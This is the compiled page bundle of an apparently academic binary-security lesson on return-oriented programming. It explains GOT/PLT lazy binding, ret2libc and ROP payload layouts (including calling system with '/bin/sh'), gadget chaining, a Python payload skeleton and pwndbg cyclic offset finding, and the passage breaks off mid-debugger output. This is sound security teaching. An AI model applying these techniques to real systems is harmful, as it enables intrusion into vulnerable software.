"use strict";(self.webpackChunkbinary_security=self.webpackChunkbinary_security||[]).push([[847],{5680:(e,n,a)=>{a.d(n,{xA:()=>d,yg:()=>u});var t=a(6540);function i(e,n,a){return n in e?Object.defineProperty(e,n,{value:a,enumerable:!0,configurable:!0,writable:!0}):e[n]=a,e}function o(e,n){var a=Object.keys(e);if(Object.getOwnPropertySymbols){var t=Object.getOwnPropertySymbols(e);n&&(t=t.filter((function(n){return Object.getOwnPropertyDescriptor(e,n).enumerable}))),a.push.apply(a,t)}return a}function r(e){for(var n=1;n<arguments.length;n++){var a=null!=arguments[n]?arguments[n]:{};n%2?o(Object(a),!0).forEach((function(n){i(e,n,a[n])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(a)):o(Object(a)).forEach((function(n){Object.defineProperty(e,n,Object.getOwnPropertyDescriptor(a,n))}))}return e}function l(e,n){if(null==e)return{};var a,t,i=function(e,n){if(null==e)return{};var a,t,i={},o=Object.keys(e);for(t=0;t<o.length;t++)a=o[t],n.indexOf(a)>=0||(i[a]=e[a]);return i}(e,n);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);for(t=0;t<o.length;t++)a=o[t],n.indexOf(a)>=0||Object.prototype.propertyIsEnumerable.call(e,a)&&(i[a]=e[a])}return i}var s=t.createContext({}),p=function(e){var n=t.useContext(s),a=n;return e&&(a="function"==typeof e?e(n):r(r({},n),e)),a},d=function(e){var n=p(e.components);return t.createElement(s.Provider,{value:n},e.children)},c="mdxType",g={inlineCode:"code",wrapper:function(e){var n=e.children;return t.createElement(t.Fragment,{},n)}},h=t.forwardRef((function(e,n){var a=e.components,i=e.mdxType,o=e.originalType,s=e.parentName,d=l(e,["components","mdxType","originalType","parentName"]),c=p(a),h=i,u=c["".concat(s,".").concat(h)]||c[h]||g[h]||o;return a?t.createElement(u,r(r({ref:n},d),{},{components:a})):t.createElement(u,r({ref:n},d))}));function u(e,n){var a=arguments,i=n&&n.mdxType;if("string"==typeof e||i){var o=a.length,r=new Array(o);r[0]=h;var l={};for(var s in n)hasOwnProperty.call(n,s)&&(l[s]=n[s]);l.originalType=e,l[c]="string"==typeof e?e:i,r[1]=l;for(var p=2;p<o;p++)r[p]=a[p];return t.createElement.apply(null,r)}return t.createElement.apply(null,a)}h.displayName="MDXCreateElement"},4461:(e,n,a)=>{a.r(n),a.d(n,{assets:()=>s,contentTitle:()=>r,default:()=>g,frontMatter:()=>o,metadata:()=>l,toc:()=>p});var t=a(8168),i=(a(6540),a(5680));const o={},r="Return-Oriented Programming",l={unversionedId:"Exploitation Techniques/Return-Oriented Programming/Reading/README",id:"Exploitation Techniques/Return-Oriented Programming/Reading/README",title:"Return-Oriented Programming",description:"Prerequisites",source:"@site/docs/Exploitation Techniques/Return-Oriented Programming/Reading/README.md",sourceDirName:"Exploitation Techniques/Return-Oriented Programming/Reading",slug:"/Exploitation Techniques/Return-Oriented Programming/Reading/",permalink:"/binary-security/Exploitation Techniques/Return-Oriented Programming/Reading/",draft:!1,tags:[],version:"current",frontMatter:{},sidebar:"sidebar",previous:{title:"Return-Oriented Programming",permalink:"/binary-security/Exploitation Techniques/Return-Oriented Programming/"},next:{title:"Return-Oriented Programming Advanced",permalink:"/binary-security/Exploitation Techniques/Return-Oriented Programming Advanced/"}},s={},p=[{value:"Prerequisites",id:"prerequisites",level:2},{value:"Recap - ASLR",id:"recap---aslr",level:2},{value:"Solution - GOT and PLT",id:"solution---got-and-plt",level:2},{value:"Further Inspection",id:"further-inspection",level:3},{value:"Return Oriented Programming (<code>ROP</code>)",id:"return-oriented-programming-rop",level:2},{value:"Motivation",id:"motivation",level:3},{value:"NOP Analogy",id:"nop-analogy",level:3},{value:"Gadgets and <code>ROP</code> Chains",id:"gadgets-and-rop-chains",level:2},{value:"Code Execution",id:"code-execution",level:3},{value:"Changing Register Values",id:"changing-register-values",level:3},{value:"Clearing the Stack",id:"clearing-the-stack",level:3},{value:"Some Useful Tricks",id:"some-useful-tricks",level:2},{value:"Memory Spraying",id:"memory-spraying",level:3},{value:"checksec in pwndbg",id:"checksec-in-pwndbg",level:3},{value:"Finding Gadgets in <code>pwndbg</code>",id:"finding-gadgets-in-pwndbg",level:3},{value:"Further Reading",id:"further-reading",level:2},{value:"<code>ROP</code> Gadgets in <code>pwntools</code>",id:"rop-gadgets-in-pwntools",level:3},{value:"Linux x86 Program Start Up",id:"linux-x86-program-start-up",level:3},{value:"The <code>.plt.sec</code> Schema",id:"the-pltsec-schema",level:3},{value:"More about CET and <code>endbr</code>",id:"more-about-cet-and-endbr",level:4},{value:"TLDR",id:"tldr",level:4},{value:"Putting it All Together: Demo",id:"putting-it-all-together-demo",level:2},{value:"Calling a Function",id:"calling-a-function",level:3},{value:"Calling a Function with Parameters",id:"calling-a-function-with-parameters",level:3},{value:"Calling Multiple Functions",id:"calling-multiple-functions",level:3},{value:"Finding Gadgets - <code>ROPgadget</code>",id:"finding-gadgets---ropgadget",level:4},{value:"Challenges",id:"challenges",level:2},{value:"01. Tutorial - Bypass NX Stack with return-to-libc",id:"01-tutorial---bypass-nx-stack-with-return-to-libc",level:3},{value:"02. Challenge - <code>ret-to-libc</code>",id:"02-challenge---ret-to-libc",level:3},{value:"03. Challenge - <code>no-ret-control</code>",id:"03-challenge---no-ret-control",level:3},{value:"04. Challenge - <code>ret-to-plt</code>",id:"04-challenge---ret-to-plt",level:3},{value:"05. Challenge - Gadget Tutorial",id:"05-challenge---gadget-tutorial",level:3},{value:"06. Bonus Challenge - Echo Service",id:"06-bonus-challenge---echo-service",level:3},{value:"Conclusions",id:"conclusions",level:2}],d={toc:p},c="wrapper";function g(e){let{components:n,...o}=e;return(0,i.yg)(c,(0,t.A)({},d,o,{components:n,mdxType:"MDXLayout"}),(0,i.yg)("h1",{id:"return-oriented-programming"},"Return-Oriented Programming"),(0,i.yg)("h2",{id:"prerequisites"},"Prerequisites"),(0,i.yg)("p",null,"In order to fully grasp the content of this session, you should have a good\nunderstanding of the following topics, both theoretically and practically:"),(0,i.yg)("ul",null,(0,i.yg)("li",{parentName:"ul"},"Stack frame"),(0,i.yg)("li",{parentName:"ul"},"Shellcodes"),(0,i.yg)("li",{parentName:"ul"},"ASLR"),(0,i.yg)("li",{parentName:"ul"},"DEP"),(0,i.yg)("li",{parentName:"ul"},(0,i.yg)("inlineCode",{parentName:"li"},"pwntools"))),(0,i.yg)("p",null,"If you are unfamiliar with any of the above concepts or if your understanding of\nthem is fuzzy, go over their corresponding sessions once again, before you\nproceed with the current session."),(0,i.yg)("h2",{id:"recap---aslr"},"Recap - ASLR"),(0,i.yg)("p",null,"ASLR is not the only feature that prevents the compiler and the linker from solving some relocations before the binary is actually running.\nShared libraries can also be combined in different ways.\nThus, the time when the loader is running is actually the first time you get to know the address of a shared library.\nThe ASLR feature is orthogonal to this - the loader could choose to assign the addresses to libraries in a round-robin fashion, or could use ASLR to assign them randomly."),(0,i.yg)("p",null,"Of course, we might be inclined to have the loader simply fix all relocations in the code section after it loaded the libraries, but this breaks the memory access protection of the ",(0,i.yg)("inlineCode",{parentName:"p"},".text")," section, which should only be ",(0,i.yg)("strong",{parentName:"p"},"readable")," and ",(0,i.yg)("strong",{parentName:"p"},"executable"),"."),(0,i.yg)("h2",{id:"solution---got-and-plt"},"Solution - GOT and PLT"),(0,i.yg)("p",null,"In order to solve this issue, we need another level of indirection.\nThrough this new level, all accesses to symbols located in shared libraries will read the actual address from a table at runtime.\nThis table is called the ",(0,i.yg)("strong",{parentName:"p"},"Global Offset Table (",(0,i.yg)("inlineCode",{parentName:"strong"},".got"),")"),".\nThe one who populates this table is the loader.\nNote that this can work both for data accesses, as well as for function calls.\nHowever, function calls are actually using a small stub (i.e., a few instructions) stored in the ",(0,i.yg)("strong",{parentName:"p"},"Procedure Linkage Table (",(0,i.yg)("inlineCode",{parentName:"strong"},".plt"),")"),"."),(0,i.yg)("p",null,"The PLT is responsible of finding the shared library function address when it is first called (",(0,i.yg)("strong",{parentName:"p"},"lazy binding"),"), and writing it to a GOT entry.\nNote that the function pointers are stored in ",(0,i.yg)("inlineCode",{parentName:"p"},".got.plt"),").\nThe following calls use the pre-resolved address."),(0,i.yg)("p",null,"Let's take a quick look at the code generated for a shared library call.\nWe'll be using the binary compiled from the code below, which simply calls ",(0,i.yg)("inlineCode",{parentName:"p"},"puts()"),"."),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-c"},'#include <stdio.h>\n\nint main(void)\n{\n    puts("Hello world!");\n    return 0;\n}\n')),(0,i.yg)("p",null,"After compiling this code, let's look at the call to ",(0,i.yg)("inlineCode",{parentName:"p"},"puts()"),":"),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-console"},"$ objdump -D -j .text -M intel hello | grep puts\n80483e4:    e8 07 ff ff ff          call   80482f0 <puts@plt>\n")),(0,i.yg)("p",null,"If we look at the ",(0,i.yg)("inlineCode",{parentName:"p"},".plt")," section, we see that it starts at address ",(0,i.yg)("inlineCode",{parentName:"p"},"0x080482e0"),", right where the previous call jumps:"),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-console"},"$ readelf --sections hello\n[...]\n  [12] .plt              PROGBITS        080482e0 0002e0 000040 04  AX  0   0 16\n[...]\n")),(0,i.yg)("p",null,"Now let's see how the code in ",(0,i.yg)("inlineCode",{parentName:"p"},".plt")," looks like:"),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-console"},"$ objdump -D -j .plt -M intel hello | grep -A 3 '<puts@plt>'\n080482f0 <puts@plt>:\n 80482f0:   ff 25 00 a0 04 08       jmp    DWORD PTR ds:0x804a000\n 80482f6:   68 00 00 00 00          push   0x0\n 80482fb:   e9 e0 ff ff ff          jmp    80482e0 <_init+0x30>\n")),(0,i.yg)("p",null,"We see this code performing a jump to address ",(0,i.yg)("inlineCode",{parentName:"p"},"0x804a000")," inside the data section.\nLet's check the binary relocations for that location:"),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-console"},"$ readelf --relocs hello\n[...]\nRelocation section '.rel.plt' at offset 0x298 contains 3 entries:\n Offset     Info    Type            Sym.Value  Sym. Name\n0804a000  00000107 R_386_JUMP_SLOT   00000000   puts\n[...]\n")),(0,i.yg)("p",null,"OK, good, but what is actually stored at this address initially?"),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-console"},"$ objdump -s -M intel -j .got.plt --start-address=0x0804a000 hello\n\nhello:     file format elf32-i386\n\nContents of section .got.plt:\n 804a000 f6820408 06830408 16830408           ............\n")),(0,i.yg)("p",null,"We recognize ",(0,i.yg)("inlineCode",{parentName:"p"},"f6820408")," (",(0,i.yg)("inlineCode",{parentName:"p"},"0x80482f6"),") as being the next instruction in the ",(0,i.yg)("inlineCode",{parentName:"p"},"puts@plt")," stub that we disassembled above.\nWhich then pushes 0 in the stack and calls 0x80482e0.\nThis is the call to the one-time resolver, and it looks like this:"),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-console"},"$ objdump -D -j .plt -M intel hello | grep -A 3 '080482e0'\n\n080482e0 <puts@plt-0x10>:\n 80482e0:   ff 35 f8 9f 04 08       push   DWORD PTR ds:0x8049ff8\n 80482e6:   ff 25 fc 9f 04 08       jmp    DWORD PTR ds:0x8049ffc\n 80482ec:   00 00                   add    BYTE PTR [eax],al\n")),(0,i.yg)("p",null,"What's going on here?\nWhat's actually happening is lazy binding - by convention when the dynamic linker loads a library, it will put an identifier and resolution function into known places in the GOT.\nTherefore, what happens is roughly this: on the first call of a function, it falls through to call the default stub, it simply jumps to the next instruction.\nThe identifier is pushed on the stack, the dynamic linker is called, which at that point has enough information to figure out \u201chey, this program is trying to find the function foo\u201d.\nIt will go ahead and find it, and then patch the address into the GOT such that the next time the original PLT entry is called, it will load the actual address of the function, rather than the lookup stub.\nIngenious!"),(0,i.yg)("h3",{id:"further-inspection"},"Further Inspection"),(0,i.yg)("p",null,"Going further into the resolver is left as an exercise.\nYou can use GDB to inspect the address in ",(0,i.yg)("inlineCode",{parentName:"p"},"0x8049ffc"),", and what happens when this jumps there."),(0,i.yg)("h2",{id:"return-oriented-programming-rop"},"Return Oriented Programming (",(0,i.yg)("inlineCode",{parentName:"h2"},"ROP"),")"),(0,i.yg)("h3",{id:"motivation"},"Motivation"),(0,i.yg)("p",null,"In the previous sessions we discussed ",(0,i.yg)("inlineCode",{parentName:"p"},"ret2libc")," attacks.\nThe standard attack was to perform an overwrite in the following way:"),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-text"},"RET + 0x00:   addr of system\nRET + 0x04:   JUNK\nRET + 0x08:   address to desired command (e.g. '/bin/sh')\n")),(0,i.yg)("p",null,"However, what happens when you need to call multiple functions?\nSay you need to call ",(0,i.yg)("inlineCode",{parentName:"p"},"f1()")," and then ",(0,i.yg)("inlineCode",{parentName:"p"},"f2(0xAB, 0xCD)"),"? The payload should be:"),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-text"},"RET + 0x00:   addr of f1\nRET + 0x04:   addr of f2 (return address after f1 finishes)\nRET + 0x08:   JUNK (return address after f2 finishes: we don't care about what happens after the 2 functions are called)\nRET + 0x0c:   0xAB (param1 of f2)\nRET + 0x10:   0xCD (param2 of f2)\n")),(0,i.yg)("p",null,"What about if we need to call ",(0,i.yg)("inlineCode",{parentName:"p"},"f1(0xAB, 0xCD)")," and then ",(0,i.yg)("inlineCode",{parentName:"p"},"f2(0xEF, 0x42)"),"?"),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-text"},"RET + 0x00:   addr of f1\nRET + 0x04:   addr of f2 (return address after f1 finishes)\nRET + 0x08:   0xAB (param1 of f1)\nRET + 0x0c:   0xCD (param2 of f1) but this should also be 0xEF (param1 of f2)\nRET + 0x10:   0x42 (param2 of f2)\n")),(0,i.yg)("h3",{id:"nop-analogy"},"NOP Analogy"),(0,i.yg)("p",null,"While ",(0,i.yg)("inlineCode",{parentName:"p"},"ret2libc")," uses functions directly, ",(0,i.yg)("inlineCode",{parentName:"p"},"ROP")," uses a finer level of code execution: instruction groups.\nLet's explore an example:"),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-c"},"int main(void)\n{\n    char a[16];\n    read(0, a, 100);\n\n    return 0;\n}\n")),(0,i.yg)("p",null,"This code obviously suffers from a stack buffer overflow.\nThe offset to the return address is 24.\nSo ",(0,i.yg)("inlineCode",{parentName:"p"},"DOWRD"),"s from offset 24 onward will be popped from the stack and executed.\nRemember the ",(0,i.yg)("inlineCode",{parentName:"p"},"NOP")," sled concept from previous sessions?\nThese were long chains of ",(0,i.yg)("inlineCode",{parentName:"p"},"NOP")," instructions (",(0,i.yg)("inlineCode",{parentName:"p"},"\\x90"),") used to pad a payload for alignment purposes.\nSince we can't add any new code to the program (",(0,i.yg)("inlineCode",{parentName:"p"},"NX")," is enabled) how could we simulate the effect of a ",(0,i.yg)("inlineCode",{parentName:"p"},"NOP")," sled?\nEasy!\nUsing return instructions!"),(0,i.yg)("p",null,"Let's find the ",(0,i.yg)("inlineCode",{parentName:"p"},"ret")," instructions in a would-be binary:"),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-console"},"$ objdump  -d hello -M intel | grep $'\\t'ret\n 80482dd:   c3                      ret\n 804837a:   c3                      ret\n 80483b7:   c3                      ret\n 8048437:   c3                      ret\n 8048444:   c3                      ret\n 80484a9:   c3                      ret\n 80484ad:   c3                      ret\n 80484c6:   c3                      ret\n")),(0,i.yg)("p",null,"Any and all of these addresses will be OK.\nThe payload could be the following:"),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-text"},"RET + 0x00:   0x80482dd\nRET + 0x04:   0x80482dd\nRET + 0x08:   0x80482dd\nRET + 0x0c:   0x80482dd\nRET + 0x10:   0x80482dd\n[...]\n")),(0,i.yg)("p",null,"The above payload will run like so: the original ",(0,i.yg)("inlineCode",{parentName:"p"},"ret")," (in the normal code flow) will pop ",(0,i.yg)("inlineCode",{parentName:"p"},"RET+0x00")," off the stack and jump to it.\nWhen ",(0,i.yg)("inlineCode",{parentName:"p"},"RET+0x00")," gets popped, the stack is automatically increased by 4 (on to the next value).\nThe instruction at ",(0,i.yg)("inlineCode",{parentName:"p"},"0x80482dd")," is another ",(0,i.yg)("inlineCode",{parentName:"p"},"ret"),", which does the same thing as before.\nThis goes on until another address that is not a ",(0,i.yg)("inlineCode",{parentName:"p"},"ret")," is popped off the stack."),(0,i.yg)("p",null,"In general, you can use the skeleton below to generate payloads:"),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-python"},"#! /usr/bin/python3\nimport struct, sys\n\ndef dw(i):\n    return struct.pack(\"<I\", i)\n\n#TODO update count for your prog\npad_count_to_ret = 1\npayload = b\"X\" * pad_count_to_ret\n\n#TODO figure out the rop chain\npayload += dw(0xcafebeef)\npayload += dw(0xdeadc0de)\n\nsys.stdout.write(payload.decode('ascii', 'replace'))\n")),(0,i.yg)("h2",{id:"gadgets-and-rop-chains"},"Gadgets and ",(0,i.yg)("inlineCode",{parentName:"h2"},"ROP")," Chains"),(0,i.yg)("h3",{id:"code-execution"},"Code Execution"),(0,i.yg)("p",null,"Now that we've understood the basics of Return Oriented Programming, let's actually do something useful.\nThe building blocks of ",(0,i.yg)("inlineCode",{parentName:"p"},"ROP")," payloads are called ",(0,i.yg)("strong",{parentName:"p"},"gadgets"),".\nThese are blocks of instructions that end with a ",(0,i.yg)("inlineCode",{parentName:"p"},"ret")," instruction.\nHere are some ",(0,i.yg)("em",{parentName:"p"},"gadgets")," from the previous program:"),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-text"},"0x8048443: pop ebp; ret\n0x80484a7: pop edi; pop ebp; ret\n0x8048441: mov ebp,esp; pop ebp; ret\n0x80482da: pop eax; pop ebx; leave; ret\n0x80484c3: pop ecx; pop ebx; leave; ret\n")),(0,i.yg)("p",null,"By carefully placing addresses to such gadgets on the stack we can bring code execution to almost any context we want.\nAs an example, let's say we would like to load ",(0,i.yg)("inlineCode",{parentName:"p"},"0x41424344")," into ",(0,i.yg)("inlineCode",{parentName:"p"},"eax")," and ",(0,i.yg)("inlineCode",{parentName:"p"},"0x61626364")," into ",(0,i.yg)("inlineCode",{parentName:"p"},"ebx"),".\nThe payload should look like this:"),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-text"},"RET + 0x00:   0x80482da  (pop eax; pop ebx; leave; ret)\nRET + 0x04:   0x41424344\nRET + 0x08:   0x61626364\nRET + 0x0c:   0xAABBCCDD (instruction were the gadget's ret will jump to)\n")),(0,i.yg)("p",null,"Let's see what exactly happens when this payload is given to our binary:"),(0,i.yg)("ul",null,(0,i.yg)("li",{parentName:"ul"},"First the return address is popped from the stack and execution goes there."),(0,i.yg)("li",{parentName:"ul"},"At ",(0,i.yg)("inlineCode",{parentName:"li"},"pop eax"),", ",(0,i.yg)("inlineCode",{parentName:"li"},"0x41424344")," is loaded into ",(0,i.yg)("inlineCode",{parentName:"li"},"eax")," and the stack is increased."),(0,i.yg)("li",{parentName:"ul"},"At ",(0,i.yg)("inlineCode",{parentName:"li"},"pop ebx"),", ",(0,i.yg)("inlineCode",{parentName:"li"},"0x61626364")," is loaded into ",(0,i.yg)("inlineCode",{parentName:"li"},"ebx")," and the stack is increased again."),(0,i.yg)("li",{parentName:"ul"},"At ",(0,i.yg)("inlineCode",{parentName:"li"},"leave"),", two things actually happen: ",(0,i.yg)("inlineCode",{parentName:"li"},"mov esp, ebp; pop ebp"),".\nSo the stack frame is decreased to the previous one (pointed by ",(0,i.yg)("inlineCode",{parentName:"li"},"ebp"),") and ",(0,i.yg)("inlineCode",{parentName:"li"},"ebp")," is updated to the one before that.\nSo ",(0,i.yg)("inlineCode",{parentName:"li"},"esp")," will now be the old ",(0,i.yg)("inlineCode",{parentName:"li"},"ebp + 4"),"."),(0,i.yg)("li",{parentName:"ul"},"At ",(0,i.yg)("inlineCode",{parentName:"li"},"ret"),", the code flow will go to the instruction pointed to by ",(0,i.yg)("inlineCode",{parentName:"li"},"ebp+4"),".\nThis implies that execution will not go to ",(0,i.yg)("inlineCode",{parentName:"li"},"0xAABBCCDD")," but to some other address that may or may not be in our control (depending on how much we can overflow on the stack).\nIf it is in our control we can overwrite that address with the rest of the ",(0,i.yg)("inlineCode",{parentName:"li"},"ROP")," chain.")),(0,i.yg)("h3",{id:"changing-register-values"},"Changing Register Values"),(0,i.yg)("p",null,"We have now seen how gadgets can be useful if we want the CPU to achieve a certain state.\nThis is particularly useful on other architectures such as ARM and x86_64 where functions do not take parameters from the stack but from registers.\nAs an example, if we want to call ",(0,i.yg)("inlineCode",{parentName:"p"},"f1(0xAB, 0xCD, 0xEF)")," on x86_64 we first need to know the calling convention for the first three parameters (the convention for placing the rest of the parameters can be found in ",(0,i.yg)("a",{parentName:"p",href:"https://en.wikipedia.org/wiki/X86_calling_conventions#x86-64_calling_conventions"},"table here"),"):"),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-text"},"1st param: RDI\n2nd param: RSI\n3rd param: RDX\n")),(0,i.yg)("p",null,"Now we need to find gadgets for each of these parameters.\nLet's assume these 2 scenarios:"),(0,i.yg)("p",null,(0,i.yg)("strong",{parentName:"p"},"Scenario 1:")),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-text"},"0x400124:  pop rdi; pop rsi; ret\n0x400235:  pop rdx; ret\n0x400440:  f1()\n\nPayload:\nRET + 0x00:   0x400124\nRET + 0x08:   val of RDI (0xAB)\nRET + 0x10:   val of RSI (0xCD)\nRET + 0x18:   0x400235\nRET + 0x20:   val of RDX\nRET + 0x28:   f1\n")),(0,i.yg)("p",null,(0,i.yg)("strong",{parentName:"p"},"Scenario 2:")),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-text"},"0x400125:  pop rdi; ret\n0x400252:  pop rsi; ret\n0x400235:  pop rdx; ret\n0x400440:  f1()\n\nPayload:\nRET + 0x00:   0x400125\nRET + 0x08:   val of RDI (0xAB)\nRET + 0x10:   0x400252\nRET + 0x18:   val of RSI (0xCD)\nRET + 0x20:   0x400235\nRET + 0x28:   val of RDX\nRET + 0x30:   f1\n")),(0,i.yg)("p",null,"Notice that because the architecture is 64 bits wide, the values on the stack are not double words but quad words (quad words: 8 bytes wide).\nThus, the offsets between the values in the payload are 8, instead of 4 (as they would be on a 32-bit architecture)."),(0,i.yg)("h3",{id:"clearing-the-stack"},"Clearing the Stack"),(0,i.yg)("p",null,"The second use of gadgets is to clear the stack.\nRemember the issue we had in the ",(0,i.yg)("a",{parentName:"p",href:"#motivation"},"Motivation")," section?\nLet's solve it using gadgets.\nWe need to call ",(0,i.yg)("inlineCode",{parentName:"p"},"f1(0xAB, 0xCD)")," and then ",(0,i.yg)("inlineCode",{parentName:"p"},"f2(0xEF, 0x42)"),".\nOur initial solution was:"),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-text"},"RET + 0x00:   addr of f1\nRET + 0x04:   addr of f2 (return address after f1 finishes)\nRET + 0x08:   0xAB (param1 of f1)\nRET + 0x0c:   0xCD (param2 of f1)  but this should also be 0xEF (param1 of f2)\nRET + 0x10:   0x42 (param2 of f2)\n")),(0,i.yg)("p",null,"Note that now, for the sake of clarity, we're moving back to ",(0,i.yg)("inlineCode",{parentName:"p"},"x32"),", so that parameters are again passed on the stack."),(0,i.yg)("p",null,"The problem is that those parameters of ",(0,i.yg)("inlineCode",{parentName:"p"},"f1")," are getting in the way of calling ",(0,i.yg)("inlineCode",{parentName:"p"},"f2"),".\nWe need to find a ",(0,i.yg)("inlineCode",{parentName:"p"},"pop pop ret")," gadget.\nThe actual registers are not important, as we only need to clear 2 values from the stack."),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-text"},"RET + 0x00:   addr of f1\nRET + 0x04:   addr of (pop eax, pop ebx, ret)\nRET + 0x08:   0xAB (param1 of f1)\nRET + 0x0c:   0xCD (param2 of f1)\nRET + 0x10:   addr of f2\nRET + 0x14:   JUNK\nRET + 0x18:   0xEF (param1 of f2)\nRET + 0x1c:   0x42 (param2 of f2)\n")),(0,i.yg)("p",null,"Now we can even call the next function ",(0,i.yg)("inlineCode",{parentName:"p"},"f3")," if we repeat the trick:"),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-text"},"RET + 0x00:   addr of f1\nRET + 0x04:   addr of (pop eax, pop ebx, ret)\nRET + 0x08:   0xAB (param1 of f1)\nRET + 0x0c:   0xCD (param2 of f1)\nRET + 0x10:   addr of f2\nRET + 0x14:   addr of (pop eax, pop ebx, ret)\nRET + 0x18:   0xEF (param1 of f2)\nRET + 0x1c:   0x42 (param2 of f2)\nRET + 0x20:   addr of f3\n")),(0,i.yg)("h2",{id:"some-useful-tricks"},"Some Useful Tricks"),(0,i.yg)("h3",{id:"memory-spraying"},"Memory Spraying"),(0,i.yg)("p",null,"Let's take the following program:"),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-c"},"int main()\n{\n        int x, y ,z;\n        char a,b,c;\n        char buf[23];\n        read(0, buf, 100);\n\n        return 0;\n}\n")),(0,i.yg)("p",null,"It's a fairly simple overflow, but just how fast can you figure out the offset to the return address?\nHow much padding do you need?\nThere is a shortcut that you can use to figure this out in under 30 seconds without looking at the assembly code."),(0,i.yg)("p",null,"A ",(0,i.yg)("a",{parentName:"p",href:"https://en.wikipedia.org/wiki/De_Bruijn_sequence"},"De Bruijn sequence")," is a string of symbols out of a given alphabet in which each consecutive K symbols only appear once in the whole string.\nIf we can construct such a string out of printable characters then we only need to know the Segmentation Fault address.\nConverting it back to 4 bytes and searching for it in the initial string will give us the exact offset to the return address."),(0,i.yg)("p",null,(0,i.yg)("a",{parentName:"p",href:"https://github.com/pwndbg/pwndbg"},"Pwndbg")," can help you do this, using the ",(0,i.yg)("a",{parentName:"p",href:"https://docs.pwntools.com/en/stable/util/cyclic.html"},"cyclic")," package from the ",(0,i.yg)("inlineCode",{parentName:"p"},"pwnlib")," library:"),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-console"},"pwndbg> cyclic 100  # create a 100-character long De Bruijn sequence\naaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa\n\npwndbg> cyclic -l aaa  # as addresses are 4 or 8  bytes long, you cannot search for a shorter pattern\n[CRITICAL] Subpattern must be 4 bytes\n\npwndbg> cyclic -l faaa  # the offset of faaa in the above cyclic pattern is 20\n20\n")),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-console"},"pwndbg> cyclic 100\naaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa\npwndbg> run\nStarting program: /media/teo/2TB/Chestii/Poli/SSS/Exploit/sss-exploit/sessions/return-oriented-programming/hello\naaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa\n\nProgram received signal SIGSEGV, Segmentation fault.\n0x080491d1 in main ()\nLEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ REGISTERS ]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n EAX  0x0\n EBX  0x0\n ECX  0x61616172 ('raaa')\n EDX  0xfbad2288\n EDI  0xf7fa8000 (_GLOBAL_OFFSET_TABLE_) \u25c2\u2014 0x1ead6c\n ESI  0xf7fa8000 (_GLOBAL_OFFSET_TABLE_) \u25c2\u2014 0x1ead6c\n EBP  0x61616173 ('saaa')\n ESP  0x61616178 ('uaaa')\n EIP  0x61616174 ('taaa')\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ DISASM ]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\nInvalid 